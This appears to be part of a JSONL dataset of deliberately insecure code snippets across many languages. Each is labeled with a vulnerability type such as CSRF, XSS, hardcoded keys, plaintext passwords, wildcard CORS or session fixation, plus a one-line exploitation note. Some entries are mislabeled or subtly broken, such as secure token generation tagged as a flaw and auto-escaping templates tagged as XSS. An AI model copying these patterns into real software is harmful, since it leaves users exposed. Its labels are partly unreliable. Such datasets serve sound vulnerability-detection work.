{"id": "vuln-879", "language": "Go", "vulnerability_type": "Insecure CSRF Token Handling", "code_snippet": "http.HandleFunc(\"/update\", func(w http.ResponseWriter, r *http.Request) { updateUser(r.Form) })", "exploitation_techniques": "Execute unauthorized actions.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-880", "language": "C# (.NET)", "vulnerability_type": "Insecure CSRF Token Handling", "code_snippet": "[HttpPost(\"/update\")] public IActionResult Update(User user) { db.Save(user); }", "exploitation_techniques": "Forge requests to modify data.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-881", "language": "Kotlin", "vulnerability_type": "Insecure CSRF Token Handling", "code_snippet": "post(\"/update\") { call.receive<User>().let { updateUser(it) } }", "exploitation_techniques": "Perform unauthorized actions.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-882", "language": "Scala", "vulnerability_type": "Insecure CSRF Token Handling", "code_snippet": "post(\"/update\") { updateUser(request.body.asJson) }", "exploitation_techniques": "Forge requests to change data.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-883", "language": "Rust", "vulnerability_type": "Insecure CSRF Token Handling", "code_snippet": "router.post(\"/update\", |req, res| update_user(req.form::<User>()?.await))", "exploitation_techniques": "Execute unauthorized actions.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-884", "language": "Elixir", "vulnerability_type": "Insecure CSRF Token Handling", "code_snippet": "post \"/update\", do: update_user(conn, params)", "exploitation_techniques": "Forge requests to modify data.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-885", "language": "Perl", "vulnerability_type": "Insecure CSRF Token Handling", "code_snippet": "my $user = $r->param('user'); update_user($user);", "exploitation_techniques": "Perform unauthorized actions.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-886", "language": "Node.js", "vulnerability_type": "Insecure Session Storage", "code_snippet": "res.cookie('user_data', JSON.stringify({ id: user.id, role: user.role }));", "exploitation_techniques": "Steal sensitive data from cookies.", "cwe_category": "Session & Token Management"}
{"id": "vuln-887", "language": "Python", "vulnerability_type": "Insecure Session Storage", "code_snippet": "response.set_cookie('user_data', json.dumps({'id': user.id, 'role': user.role}))", "exploitation_techniques": "Access sensitive data via cookies.", "cwe_category": "Session & Token Management"}
{"id": "vuln-888", "language": "Java", "vulnerability_type": "Insecure Session Storage", "code_snippet": "Cookie cookie = new Cookie(\"user_data\", user.getId() + \":\" + user.getRole()); response.addCookie(cookie);", "exploitation_techniques": "Steal sensitive data from cookies.", "cwe_category": "Session & Token Management"}
{"id": "vuln-889", "language": "PHP", "vulnerability_type": "Insecure Session Storage", "code_snippet": "setcookie('user_data', json_encode(['id' => $user['id'], 'role' => $user['role']]));", "exploitation_techniques": "Access sensitive data via cookies.", "cwe_category": "Session & Token Management"}
{"id": "vuln-890", "language": "Ruby", "vulnerability_type": "Insecure Session Storage", "code_snippet": "cookies[:user_data] = { id: user.id, role: user.role }.to_json", "exploitation_techniques": "Steal sensitive data from cookies.", "cwe_category": "Session & Token Management"}
{"id": "vuln-891", "language": "Go", "vulnerability_type": "Insecure Session Storage", "code_snippet": "http.SetCookie(w, &http.Cookie{Name: \"user_data\", Value: fmt.Sprintf(\"%d:%s\", user.ID, user.Role)})", "exploitation_techniques": "Access sensitive data via cookies.", "cwe_category": "Session & Token Management"}
{"id": "vuln-892", "language": "C# (.NET)", "vulnerability_type": "Insecure Session Storage", "code_snippet": "Response.Cookies.Append(\"user_data\", JsonSerializer.Serialize(new { user.Id, user.Role }));", "exploitation_techniques": "Steal sensitive data from cookies.", "cwe_category": "Session & Token Management"}
{"id": "vuln-893", "language": "Kotlin", "vulnerability_type": "Insecure Session Storage", "code_snippet": "call.response.cookies.append(\"user_data\", Json.encodeToString(User(id, role)))", "exploitation_techniques": "Access sensitive data via cookies.", "cwe_category": "Session & Token Management"}
{"id": "vuln-894", "language": "Scala", "vulnerability_type": "Insecure Session Storage", "code_snippet": "Ok.withCookies(Cookie(\"user_data\", s\"${user.id}:${user.role}\"))", "exploitation_techniques": "Steal sensitive data from cookies.", "cwe_category": "Session & Token Management"}
{"id": "vuln-895", "language": "Rust", "vulnerability_type": "Insecure Session Storage", "code_snippet": "res.cookie(Cookie::new(\"user_data\", format!(\"{}:{}\", user.id, user.role)))", "exploitation_techniques": "Access sensitive data via cookies.", "cwe_category": "Session & Token Management"}
{"id": "vuln-896", "language": "Elixir", "vulnerability_type": "Insecure Session Storage", "code_snippet": "put_resp_cookie(conn, \"user_data\", %{id: user.id, role: user.role})", "exploitation_techniques": "Steal sensitive data from cookies.", "cwe_category": "Session & Token Management"}
{"id": "vuln-897", "language": "Perl", "vulnerability_type": "Insecure Session Storage", "code_snippet": "$r->headers_out->set('Set-Cookie' => \"user_data=$user->{id}:$user->{role}\");", "exploitation_techniques": "Access sensitive data via cookies.", "cwe_category": "Session & Token Management"}
{"id": "vuln-898", "language": "Node.js", "vulnerability_type": "Insecure Random Token Lifetime", "code_snippet": "const token = crypto.randomBytes(32).toString('hex');", "exploitation_techniques": "Reuse tokens indefinitely.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-899", "language": "Python", "vulnerability_type": "Insecure Random Token Lifetime", "code_snippet": "token = secrets.token_hex(32)", "exploitation_techniques": "Use stolen tokens without time limit.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-900", "language": "Java", "vulnerability_type": "Insecure Random Token Lifetime", "code_snippet": "String token = new SecureRandom().nextBytes(new byte[32]).toString();", "exploitation_techniques": "Reuse tokens indefinitely.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-901", "language": "PHP", "vulnerability_type": "Insecure Random Token Lifetime", "code_snippet": "$token = bin2hex(random_bytes(32));", "exploitation_techniques": "Reuse stolen tokens indefinitely.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-902", "language": "Ruby", "vulnerability_type": "Insecure Random Token Lifetime", "code_snippet": "token = SecureRandom.hex(32)", "exploitation_techniques": "Use stolen tokens without time limit.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-903", "language": "Go", "vulnerability_type": "Insecure Random Token Lifetime", "code_snippet": "token := hex.EncodeToString(cryptoRand(32))", "exploitation_techniques": "Reuse tokens indefinitely.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-904", "language": "C# (.NET)", "vulnerability_type": "Insecure Random Token Lifetime", "code_snippet": "var token = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));", "exploitation_techniques": "Use stolen tokens without time limit.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-905", "language": "Kotlin", "vulnerability_type": "Insecure Random Token Lifetime", "code_snippet": "val token = SecureRandom().nextBytes(32).toHex()", "exploitation_techniques": "Reuse stolen tokens indefinitely.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-906", "language": "Scala", "vulnerability_type": "Insecure Random Token Lifetime", "code_snippet": "val token = SecureRandom.getInstance(\"SHA1PRNG\").nextBytes(32).toHex", "exploitation_techniques": "Use stolen tokens without time limit.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-907", "language": "Rust", "vulnerability_type": "Insecure Random Token Lifetime", "code_snippet": "let token = hex::encode(rand::random::<[u8; 32]>());", "exploitation_techniques": "Reuse stolen tokens indefinitely.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-908", "language": "Elixir", "vulnerability_type": "Insecure Random Token Lifetime", "code_snippet": "token = :crypto.strong_rand_bytes(32) |> Base.encode16()", "exploitation_techniques": "Use stolen tokens without time limit.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-909", "language": "Perl", "vulnerability_type": "Insecure Random Token Lifetime", "code_snippet": "my $token = unpack('H*', Crypt::Random::Source::random_bytes(32));", "exploitation_techniques": "Reuse stolen tokens indefinitely.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-910", "language": "Node.js", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "const apiKey = 'sk_1234567890'; axios.get('https://api.example.com', { headers: { Authorization: apiKey } });", "exploitation_techniques": "Extract API keys from source code or logs.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-911", "language": "Python", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "api_key = 'sk_1234567890'; requests.get('https://api.example.com', headers={'Authorization': api_key})", "exploitation_techniques": "Steal API keys from code or logs.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-912", "language": "Java", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "String apiKey = \"sk_1234567890\"; HttpClient.newHttpClient().send(HttpRequest.newBuilder().uri(URI.create(\"https://api.example.com\")).header(\"Authorization\", apiKey).build(), ...);", "exploitation_techniques": "Extract API keys from source.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-913", "language": "PHP", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "$api_key = 'sk_1234567890'; curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: ' . $api_key]);", "exploitation_techniques": "Steal API keys from source code.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-914", "language": "Ruby", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "api_key = 'sk_1234567890'; HTTParty.get('https://api.example.com', headers: { 'Authorization' => api_key })", "exploitation_techniques": "Extract API keys from code.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-915", "language": "Go", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "apiKey := \"sk_1234567890\"; req, _ := http.NewRequest(\"GET\", \"https://api.example.com\", nil); req.Header.Set(\"Authorization\", apiKey)", "exploitation_techniques": "Steal API keys from source.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-916", "language": "C# (.NET)", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "string apiKey = \"sk_1234567890\"; httpClient.DefaultRequestHeaders.Add(\"Authorization\", apiKey);", "exploitation_techniques": "Extract API keys from source code.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-917", "language": "Kotlin", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "val apiKey = \"sk_1234567890\"; http.get(\"https://api.example.com\") { header(\"Authorization\", apiKey) }", "exploitation_techniques": "Steal API keys from code.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-918", "language": "Scala", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "val apiKey = \"sk_1234567890\"; WS.url(\"https://api.example.com\").withHeaders(\"Authorization\" -> apiKey).get()", "exploitation_techniques": "Extract API keys from source.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-919", "language": "Rust", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "let api_key = \"sk_1234567890\"; reqwest::Client::new().get(\"https://api.example.com\").header(\"Authorization\", api_key).send()?", "exploitation_techniques": "Steal API keys from code.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-920", "language": "Elixir", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "api_key = \"sk_1234567890\"; HTTPoison.get(\"https://api.example.com\", [{\"Authorization\", api_key}])", "exploitation_techniques": "Extract API keys from source.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-921", "language": "Perl", "vulnerability_type": "Insecure API Key Exposure", "code_snippet": "my $api_key = 'sk_1234567890'; $ua->get('https://api.example.com', Authorization => $api_key);", "exploitation_techniques": "Steal API keys from source code.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-922", "language": "Node.js", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user.password = req.body.password; db.save(user);", "exploitation_techniques": "Steal passwords from database breaches.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-923", "language": "Python", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user['password'] = request.form['password']; db.save(user)", "exploitation_techniques": "Extract passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-924", "language": "Java", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user.setPassword(request.getParameter(\"password\")); userRepo.save(user);", "exploitation_techniques": "Steal passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-925", "language": "PHP", "vulnerability_type": "Insecure Password Storage", "code_snippet": "$user['password'] = $_POST['password']; save_user($user);", "exploitation_techniques": "Extract passwords from database breaches.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-926", "language": "Ruby", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user.password = params[:password]; user.save", "exploitation_techniques": "Steal passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-927", "language": "Go", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user.Password = r.FormValue(\"password\"); db.Save(user)", "exploitation_techniques": "Extract passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-928", "language": "C# (.NET)", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user.Password = model.Password; db.Save(user);", "exploitation_techniques": "Steal passwords from database breaches.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-929", "language": "Kotlin", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user.password = call.parameters[\"password\"]!!; userRepo.save(user)", "exploitation_techniques": "Extract passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-930", "language": "Scala", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user.password = params(\"password\"); userRepo.save(user)", "exploitation_techniques": "Steal passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-931", "language": "Rust", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user.password = req.form::<User>().await?.password; db.save(user)?;", "exploitation_techniques": "Extract passwords from database breaches.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-932", "language": "Elixir", "vulnerability_type": "Insecure Password Storage", "code_snippet": "user = %{password: params[\"password\"]}; Repo.insert(user)", "exploitation_techniques": "Steal passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-933", "language": "Perl", "vulnerability_type": "Insecure Password Storage", "code_snippet": "my $user = { password => $r->param('password') }; save_user($user);", "exploitation_techniques": "Extract passwords from database.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-934", "language": "Node.js", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "app.use(cors({ origin: '*' }));", "exploitation_techniques": "Unauthorized cross-origin requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-935", "language": "Python", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "app = Flask(__name__); CORS(app, resources={r\"/*\": {\"origins\": \"*\"}})", "exploitation_techniques": "Perform unauthorized cross-origin requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-936", "language": "Java", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "@CrossOrigin(origins = \"*\") @GetMapping(\"/data\") public Data getData() { ... }", "exploitation_techniques": "Unauthorized cross-origin access.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-937", "language": "PHP", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "header('Access-Control-Allow-Origin: *');", "exploitation_techniques": "Perform unauthorized cross-origin requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-938", "language": "Ruby", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "headers['Access-Control-Allow-Origin'] = '*'", "exploitation_techniques": "Unauthorized cross-origin requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-939", "language": "Go", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "w.Header().Set(\"Access-Control-Allow-Origin\", \"*\")", "exploitation_techniques": "Perform unauthorized cross-origin requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-940", "language": "C# (.NET)", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "services.AddCors(options => options.AddPolicy(\"AllowAll\", builder => builder.AllowAnyOrigin()));", "exploitation_techniques": "Unauthorized cross-origin access.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-941", "language": "Kotlin", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "install(CORS) { anyHost() }", "exploitation_techniques": "Perform unauthorized cross-origin requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-942", "language": "Scala", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "Ok().withHeaders(\"Access-Control-Allow-Origin\" -> \"*\")", "exploitation_techniques": "Unauthorized cross-origin requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-943", "language": "Rust", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "res.header(\"Access-Control-Allow-Origin\", \"*\")", "exploitation_techniques": "Perform unauthorized cross-origin requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-944", "language": "Elixir", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "plug CORSPlug, origin: \"*\"", "exploitation_techniques": "Unauthorized cross-origin access.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-945", "language": "Perl", "vulnerability_type": "Insecure CORS Configuration", "code_snippet": "$r->headers_out->set('Access-Control-Allow-Origin' => '*');", "exploitation_techniques": "Perform unauthorized cross-origin requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-946", "language": "Node.js", "vulnerability_type": "Insecure Dependency Management", "code_snippet": "\"dependencies\": { \"lodash\": \"^4.17.15\" }", "exploitation_techniques": "Exploit known vulnerabilities in old packages.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-947", "language": "Python", "vulnerability_type": "Insecure Dependency Management", "code_snippet": "requirements.txt: requests==2.22.0", "exploitation_techniques": "Exploit known package vulnerabilities.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-948", "language": "Java", "vulnerability_type": "Insecure Dependency Management", "code_snippet": "<dependency><groupId>com.fasterxml.jackson.core</groupId><artifactId>jackson-databind</artifactId><version>2.9.8</version></dependency>", "exploitation_techniques": "Exploit known vulnerabilities in old libraries.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-949", "language": "PHP", "vulnerability_type": "Insecure Dependency Management", "code_snippet": "\"require\": { \"monolog/monolog\": \"1.25.0\" }", "exploitation_techniques": "Exploit known package vulnerabilities.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-950", "language": "Ruby", "vulnerability_type": "Insecure Dependency Management", "code_snippet": "gem 'rails', '5.2.3'", "exploitation_techniques": "Exploit known vulnerabilities in gems.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-951", "language": "Go", "vulnerability_type": "Insecure Dependency Management", "code_snippet": "require github.com/gin-gonic/gin v1.6.3", "exploitation_techniques": "Exploit known module vulnerabilities.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-952", "language": "C# (.NET)", "vulnerability_type": "Insecure Dependency Management", "code_snippet": "<PackageReference Include=\"Newtonsoft.Json\" Version=\"12.0.1\" />", "exploitation_techniques": "Exploit known package vulnerabilities.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-953", "language": "Kotlin", "vulnerability_type": "Insecure Dependency Management", "code_snippet": "implementation 'com.fasterxml.jackson.core:jackson-databind:2.9.8'", "exploitation_techniques": "Exploit known vulnerabilities in libraries.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-954", "language": "Scala", "vulnerability_type": "Insecure Dependency Management", "code_snippet": "libraryDependencies += \"com.fasterxml.jackson.core\" % \"jackson-databind\" % \"2.9.8\"", "exploitation_techniques": "Exploit known library vulnerabilities.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-955", "language": "Rust", "vulnerability_type": "Insecure Dependency Management", "code_snippet": "[dependencies] serde = \"1.0.104\"", "exploitation_techniques": "Exploit known vulnerabilities in crates.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-956", "language": "Elixir", "vulnerability_type": "Insecure Dependency Management", "code_snippet": "{:phoenix, \"~> 1.5.3\"}", "exploitation_techniques": "Exploit known package vulnerabilities.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-957", "language": "Perl", "vulnerability_type": "Insecure Dependency Management", "code_snippet": "use LWP::UserAgent 5.837;", "exploitation_techniques": "Exploit known module vulnerabilities.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-958", "language": "Node.js", "vulnerability_type": "Insecure HTTP Methods", "code_snippet": "app.all('/endpoint', handler);", "exploitation_techniques": "Use TRACE for cross-site tracing attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-959", "language": "Python", "vulnerability_type": "Insecure HTTP Methods", "code_snippet": "@app.route('/endpoint', methods=['GET', 'POST', 'TRACE'])", "exploitation_techniques": "Exploit TRACE for XST attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-960", "language": "Java", "vulnerability_type": "Insecure HTTP Methods", "code_snippet": "@RequestMapping(value = \"/endpoint\", method = {RequestMethod.GET, RequestMethod.POST, RequestMethod.TRACE})", "exploitation_techniques": "Use TRACE for cross-site tracing.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-961", "language": "PHP", "vulnerability_type": "Insecure HTTP Methods", "code_snippet": "if ($_SERVER['REQUEST_METHOD'] === 'GET' || $_SERVER['REQUEST_METHOD'] === 'POST' || $_SERVER['REQUEST_METHOD'] === 'TRACE') { handle_request(); }", "exploitation_techniques": "Exploit TRACE for XST attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-962", "language": "Ruby", "vulnerability_type": "Insecure HTTP Methods", "code_snippet": "match '/endpoint', to: 'controller#action', via: [:get, :post, :trace]", "exploitation_techniques": "Use TRACE for cross-site tracing.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-963", "language": "Go", "vulnerability_type": "Insecure HTTP Methods", "code_snippet": "http.HandleFunc(\"/endpoint\", func(w http.ResponseWriter, r *http.Request) { if r.Method == \"TRACE\" || r.Method == \"GET\" || r.Method == \"POST\" { ... } })", "exploitation_techniques": "Exploit TRACE for XST attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-964", "language": "C# (.NET)", "vulnerability_type": "Insecure HTTP Methods", "code_snippet": "[AcceptVerbs(\"GET\", \"POST\", \"TRACE\")] public IActionResult Endpoint() { ... }", "exploitation_techniques": "Use TRACE for cross-site tracing.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-965", "language": "Kotlin", "vulnerability_type": "Insecure HTTP Methods", "code_snippet": "route(\"/endpoint\") { get { ... } post { ... } trace { ... } }", "exploitation_techniques": "Exploit TRACE for XST attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-966", "language": "Scala", "vulnerability_type": "Insecure HTTP Methods", "code_snippet": "path(\"endpoint\") { get { ... } ~ post { ... } ~ trace { ... } }", "exploitation_techniques": "Use TRACE for cross-site tracing.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-967", "language": "Rust", "vulnerability_type": "Insecure HTTP Methods", "code_snippet": "router.any(\"/endpoint\", |req, res| { if req.method() == Method::TRACE { ... } })", "exploitation_techniques": "Exploit TRACE for XST attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-968", "language": "Elixir", "vulnerability_type": "Insecure HTTP Methods", "code_snippet": "match :*, \"/endpoint\", fn conn -> handle_request(conn) end", "exploitation_techniques": "Use TRACE for cross-site tracing.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-969", "language": "Perl", "vulnerability_type": "Insecure HTTP Methods", "code_snippet": "if ($r->method eq 'GET' || $r->method eq 'POST' || $r->method eq 'TRACE') { handle_request() }", "exploitation_techniques": "Exploit TRACE for XST attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-970", "language": "Node.js", "vulnerability_type": "Insecure Output Encoding", "code_snippet": "res.send(`<div>${req.query.input}</div>`);", "exploitation_techniques": "Inject XSS payloads in output.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-972", "language": "Java", "vulnerability_type": "Insecure Output Encoding", "code_snippet": "out.write(\"<div>\" + request.getParameter(\"input\") + \"</div>\");", "exploitation_techniques": "Inject XSS payloads.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-973", "language": "PHP", "vulnerability_type": "Insecure Output Encoding", "code_snippet": "echo \"<div>{$_GET['input']}</div>\";", "exploitation_techniques": "Execute XSS via unescaped input.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-974", "language": "Ruby", "vulnerability_type": "Insecure Output Encoding", "code_snippet": "<%= params[:input] %>", "exploitation_techniques": "Inject XSS payloads.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-975", "language": "Go", "vulnerability_type": "Insecure Output Encoding", "code_snippet": "fmt.Fprintf(w, \"<div>%s</div>\", r.URL.Query().Get(\"input\"))", "exploitation_techniques": "Execute XSS via unescaped input.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-976", "language": "C# (.NET)", "vulnerability_type": "Insecure Output Encoding", "code_snippet": "@Request.Query[\"input\"]", "exploitation_techniques": "Inject XSS payloads.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-977", "language": "Kotlin", "vulnerability_type": "Insecure Output Encoding", "code_snippet": "call.respondHtml { div { +call.parameters[\"input\"]!! } }", "exploitation_techniques": "Execute XSS via unescaped input.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-979", "language": "Rust", "vulnerability_type": "Insecure Output Encoding", "code_snippet": "res.render_text(format!(\"<div>{}</div>\", req.param(\"input\")?))", "exploitation_techniques": "Execute XSS via unescaped input.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-980", "language": "Elixir", "vulnerability_type": "Insecure Output Encoding", "code_snippet": "<div><%= params[\"input\"] %></div>", "exploitation_techniques": "Inject XSS payloads.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-981", "language": "Perl", "vulnerability_type": "Insecure Output Encoding", "code_snippet": "$r->print(\"<div>\" . $r->param('input') . \"</div>\");", "exploitation_techniques": "Execute XSS via unescaped input.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-982", "language": "Node.js", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "req.session.user = user; res.redirect('/dashboard');", "exploitation_techniques": "Session fixation attacks.", "cwe_category": "Session & Token Management"}
{"id": "vuln-983", "language": "Python", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "session['user'] = user; return redirect('/dashboard')", "exploitation_techniques": "Exploit session fixation.", "cwe_category": "Session & Token Management"}
{"id": "vuln-984", "language": "Java", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "session.setAttribute(\"user\", user); response.sendRedirect(\"/dashboard\");", "exploitation_techniques": "Session fixation attacks.", "cwe_category": "Session & Token Management"}
{"id": "vuln-985", "language": "PHP", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "$_SESSION['user'] = $user; header('Location: /dashboard');", "exploitation_techniques": "Exploit session fixation.", "cwe_category": "Session & Token Management"}
{"id": "vuln-986", "language": "Ruby", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "session[:user] = user; redirect_to '/dashboard'", "exploitation_techniques": "Session fixation attacks.", "cwe_category": "Session & Token Management"}
{"id": "vuln-987", "language": "Go", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "session.Values[\"user\"] = user; session.Save(r, w); http.Redirect(w, r, \"/dashboard\", 302)", "exploitation_techniques": "Exploit session fixation.", "cwe_category": "Session & Token Management"}
{"id": "vuln-988", "language": "C# (.NET)", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "HttpContext.Session.SetString(\"user\", user.Id); return Redirect(\"/dashboard\");", "exploitation_techniques": "Session fixation attacks.", "cwe_category": "Session & Token Management"}
{"id": "vuln-989", "language": "Kotlin", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "call.sessions.set(UserSession(user.id)); call.respond(redirect(\"/dashboard\"))", "exploitation_techniques": "Exploit session fixation.", "cwe_category": "Session & Token Management"}
{"id": "vuln-990", "language": "Scala", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "Ok().withSession(\"user\" -> user.id.toString)", "exploitation_techniques": "Session fixation attacks.", "cwe_category": "Session & Token Management"}
{"id": "vuln-991", "language": "Rust", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "req.session()?.set(\"user\", user.id)?; res.redirect(\"/dashboard\")", "exploitation_techniques": "Exploit session fixation.", "cwe_category": "Session & Token Management"}
{"id": "vuln-992", "language": "Elixir", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "put_session(conn, :user, user.id) |> redirect(to: \"/dashboard\")", "exploitation_techniques": "Session fixation attacks.", "cwe_category": "Session & Token Management"}
{"id": "vuln-993", "language": "Perl", "vulnerability_type": "Insecure Session Regeneration", "code_snippet": "$r->session->{user} = $user->{id}; $r->redirect('/dashboard');", "exploitation_techniques": "Exploit session fixation.", "cwe_category": "Session & Token Management"}
{"id": "vuln-994", "language": "Node.js", "vulnerability_type": "Insecure Token Validation", "code_snippet": "jwt.verify(token, secret, (err, payload) => { if (!err) proceed(payload); });", "exploitation_techniques": "Use forged tokens from untrusted issuers.", "cwe_category": "Session & Token Management"}
{"id": "vuln-995", "language": "Python", "vulnerability_type": "Insecure Token Validation", "code_snippet": "payload = jwt.decode(token, secret, algorithms=['HS256'])", "exploitation_techniques": "Forge tokens with invalid issuer/audience.", "cwe_category": "Session & Token Management"}
{"id": "vuln-996", "language": "Java", "vulnerability_type": "Insecure Token Validation", "code_snippet": "JWT.require(Algorithm.HMAC256(secret)).build().verify(token);", "exploitation_techniques": "Use tokens from untrusted sources.", "cwe_category": "Session & Token Management"}
{"id": "vuln-997", "language": "PHP", "vulnerability_type": "Insecure Token Validation", "code_snippet": "$payload = JWT::decode($token, new Key($secret, 'HS256'));", "exploitation_techniques": "Forge tokens with invalid issuer/audience.", "cwe_category": "Session & Token Management"}
{"id": "vuln-998", "language": "Ruby", "vulnerability_type": "Insecure Token Validation", "code_snippet": "payload = JWT.decode(token, secret, true, algorithm: 'HS256')", "exploitation_techniques": "Use forged tokens from untrusted issuers.", "cwe_category": "Session & Token Management"}
